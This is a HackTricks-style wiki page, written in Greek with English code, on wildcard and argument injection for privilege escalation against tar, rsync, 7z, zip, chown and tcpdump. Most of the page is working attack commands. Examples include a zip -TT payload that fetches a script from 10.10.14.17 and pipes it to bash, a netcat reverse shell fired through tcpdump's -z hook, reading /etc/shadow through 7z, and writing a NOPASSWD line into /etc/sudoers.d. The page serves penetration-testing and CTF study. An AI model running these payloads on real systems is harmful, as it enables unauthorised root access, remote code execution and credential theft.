# Wildcards — Μικρά Κόλπα

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** συμβαίνει όταν ένα script με αυξημένα προνόμια εκτελεί ένα Unix binary όπως `tar`, `chown`, `rsync`, `zip`, `7z`, … με ένα μη-quoted wildcard όπως `*`.
> Επειδή το shell επεκτείνει το wildcard **πριν** εκτελέσει το binary, ένας επιτιθέμενος που μπορεί να δημιουργήσει αρχεία στον τρέχοντα κατάλογο εργασίας μπορεί να φτιάξει ονόματα αρχείων που ξεκινούν με `-`, ώστε να ερμηνεύονται ως **options αντί για δεδομένα**, ουσιαστικά «μεταφέροντας» αυθαίρετα flags ή ακόμα και εντολές.
> Αυτή η σελίδα συγκεντρώνει τα πιο χρήσιμα primitives, πρόσφατη έρευνα και σύγχρονες μεθόδους ανίχνευσης για 2023-2025.

## chown / chmod

Μπορείτε να **αντιγράψετε τον owner/group ή τα permission bits ενός οποιουδήποτε αρχείου** εκμεταλλευόμενοι την παράμετρο `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Όταν ο root αργότερα εκτελεί κάτι σαν:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` εγχέεται, προκαλώντας σε *όλα* τα αρχεία που ταιριάζουν να κληρονομήσουν την ιδιοκτησία/δικαιώματα του `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (συνδυαστική επίθεση).
Δείτε επίσης την κλασική εργασία της DefenseCode για λεπτομέρειες.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Εκτελέστε αυθαίρετες εντολές εκμεταλλευόμενοι τη λειτουργία **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Μόλις ο root τρέξει π.χ. `tar -czf /root/backup.tgz *`, το `shell.sh` εκτελείται ως root.

### bsdtar / macOS 14+

Το προεπιλεγμένο `tar` στις πρόσφατες εκδόσεις macOS (βασισμένο στο `libarchive`) δεν υλοποιεί το `--checkpoint`, αλλά μπορείτε να επιτύχετε εκτέλεση κώδικα με τη σημαία **--use-compress-program** που σας επιτρέπει να καθορίσετε έναν εξωτερικό συμπιεστή.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Όταν ένα script με προνόμια εκτελεί `tar -cf backup.tar *`, θα ξεκινήσει το `/bin/sh`.

---

## rsync

`rsync` σας επιτρέπει να παρακάμψετε το remote shell ή ακόμα και το remote binary μέσω command-line flags που ξεκινούν με `-e` ή `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Εάν ο root αργότερα αρχειοθετήσει τον κατάλογο με `rsync -az * backup:/srv/`, η εγχυμένη flag εκκινεί το shell σας στο απομακρυσμένο σύστημα.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Ακόμα και όταν το script με προνόμια *αμυντικά* προθέτει το wildcard με `--` (για να σταματήσει το option parsing), η μορφή 7-Zip υποστηρίζει **file list files** με το να προθέτει το όνομα αρχείου με `@`. Ο συνδυασμός αυτού με ένα symlink σας επιτρέπει να *exfiltrate arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Εάν ο root εκτελέσει κάτι σαν:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip will attempt to read `root.txt` (→ `/etc/shadow`) as a file list and will bail out, **εκτυπώνοντας τα περιεχόμενα στο stderr**.

---

## zip

Υπάρχουν δύο πολύ πρακτικά primitives όταν μια εφαρμογή περνάει στον `zip` ονόματα αρχείων ελεγχόμενα από τον χρήστη (είτε μέσω ενός wildcard είτε απαριθμώντας ονόματα χωρίς `--`).

- RCE via test hook: `-T` enables “test archive” and `-TT <cmd>` replaces the tester with an arbitrary program (long form: `--unzip-command <cmd>`). Αν μπορείς να εισάγεις ονόματα αρχείων που ξεκινούν με `-`, split the flags across distinct filenames so short-options parsing works:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Σημειώσεις
- ΜΗΝ δοκιμάσετε ένα μόνο όνομα αρχείου όπως `'-T -TT <cmd>'` — οι short options αναλύονται ανά χαρακτήρα και θα αποτύχει. Χρησιμοποιήστε ξεχωριστά tokens όπως φαίνεται.
- Εάν οι slashes αφαιρούνται από τα ονόματα αρχείων από την app, κάντε fetch από έναν bare host/IP (default path `/index.html`) και αποθηκεύστε το τοπικά με `-O`, και μετά εκτελέστε.
- Μπορείτε να debug το parsing με `-sc` (show processed argv) ή `-h2` (more help) για να κατανοήσετε πώς καταναλώνονται τα tokens.

Παράδειγμα (τοπική συμπεριφορά στο zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Αν το web layer εμφανίζει το stdout/stderr του `zip` (συνηθισμένο σε naive wrappers), injected flags όπως `--help` ή αποτυχίες από κακές επιλογές θα εμφανιστούν στην HTTP response, επιβεβαιώνοντας command-line injection και βοηθώντας στη ρύθμιση των payload.

---

## Επιπλέον binaries ευάλωτα σε wildcard injection (2023-2025 quick list)

Οι παρακάτω εντολές έχουν καταχραστεί σε σύγχρονα CTFs και πραγματικά περιβάλλοντα. Το payload δημιουργείται πάντα ως *filename* μέσα σε έναν writable κατάλογο που αργότερα θα επεξεργαστεί με ένα wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Ανάγνωση περιεχομένου αρχείου |
| `flock` | `-c <cmd>` | Εκτέλεση εντολής |
| `git`   | `-c core.sshCommand=<cmd>` | Εκτέλεση εντολής μέσω git over SSH |
| `scp`   | `-S <cmd>` | Εκκίνηση αυθαίρετου προγράμματος αντί για ssh |

Αυτά τα primitives είναι λιγότερο κοινά από τα *tar/rsync/zip* κλασικά αλλά αξίζει να τα ελέγξετε όταν κυνηγάτε.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Όταν ένα restricted shell ή vendor wrapper κατασκευάζει μια γραμμή εντολής `tcpdump` συνδέοντας πεδία που ελέγχονται από τον χρήστη (π.χ. μια παράμετρο "file name") χωρίς αυστηρό quoting/validation, μπορείτε να περάσετε κρυφά επιπλέον `tcpdump` flags. Ο συνδυασμός `-G` (time-based rotation), `-W` (limit number of files) και `-z <cmd>` (post-rotate command) οδηγεί σε arbitrary command execution ως ο χρήστης που τρέχει το tcpdump (συχνά root σε appliances).

Preconditions:

- Μπορείτε να επηρεάσετε το `argv` που περνά στο `tcpdump` (π.χ. μέσω ενός wrapper όπως `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Ο wrapper δεν καθαρίζει (sanitize) τα κενά ή τα `-`-προθετικά tokens στο πεδίο file name.

Classic PoC (εκτελεί ένα reverse shell script από ένα writable path):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Λεπτομέρειες:

- `-G 1 -W 1` αναγκάζει άμεση περιστροφή μετά το πρώτο ταιριαστό πακέτο.
- `-z <cmd>` εκτελεί την post-rotate εντολή μία φορά ανά περιστροφή. Πολλές υλοποιήσεις εκτελούν `<cmd> <savefile>`. Αν το `<cmd>` είναι script/interpreter, βεβαιώσου ότι ο χειρισμός των ορισμάτων ταιριάζει με το payload σου.

No-removable-media variants:

- Αν έχεις οποιοδήποτε άλλο primitive για εγγραφή αρχείων (π.χ. έναν ξεχωριστό command wrapper που επιτρέπει output redirection), τοποθέτησε το script σου σε ένα γνωστό path και ενεργοποίησε `-z /bin/sh /path/script.sh` ή `-z /path/script.sh` ανάλογα με τα semantics της πλατφόρμας.
- Ορισμένοι vendor wrappers περιστρέφουν σε θέσεις που μπορεί να ελέγξει ο attacker. Αν μπορείς να επηρεάσεις το rotated path (symlink/directory traversal), μπορείς να κατευθύνεις το `-z` να εκτελέσει περιεχόμενο που ελέγχεις πλήρως χωρίς εξωτερικά μέσα.

---

## sudoers: tcpdump with wildcards/additional args → αυθαίρετη εγγραφή/ανάγνωση και root

Πολύ συνηθισμένο αντι-πρότυπο στο sudoers:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Προβλήματα
- Ο glob `*` και οι επιτρεπτικές προτυπώσεις περιορίζουν μόνο το πρώτο όρισμα `-w`. Το `tcpdump` δέχεται πολλαπλές επιλογές `-w`· υπερισχύει η τελευταία.
- Ο κανόνας δεν περιορίζει άλλες επιλογές, οπότε `-Z`, `-r`, `-V`, κ.λπ. επιτρέπονται.

Βασικά στοιχεία
- Αντικαταστήστε το μονοπάτι προορισμού με ένα δεύτερο `-w` (το πρώτο ικανοποιεί μόνο το sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal μέσα στο πρώτο `-w` για να διαφύγετε από το περιορισμένο δέντρο:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Εξαναγκάστε την ιδιοκτησία εξόδου με `-Z root` (δημιουργεί αρχεία που ανήκουν στον root οπουδήποτε):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Εγγραφή αυθαίρετου περιεχομένου επαναπαίζοντας ένα κατασκευασμένο PCAP μέσω `-r` (π.χ., για να προσθέσετε μια γραμμή στο sudoers):

<details>
<summary>Δημιουργήστε ένα PCAP που περιέχει το ακριβές ASCII payload και γράψτε το ως root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Ανάγνωση αυθαίρετου αρχείου/secret leak με `-V <file>` (ερμηνεύει μια λίστα savefiles). Οι διαγνωστικές πληροφορίες σφαλμάτων συχνά εμφανίζουν γραμμές, leaking content:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Αναφορές

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
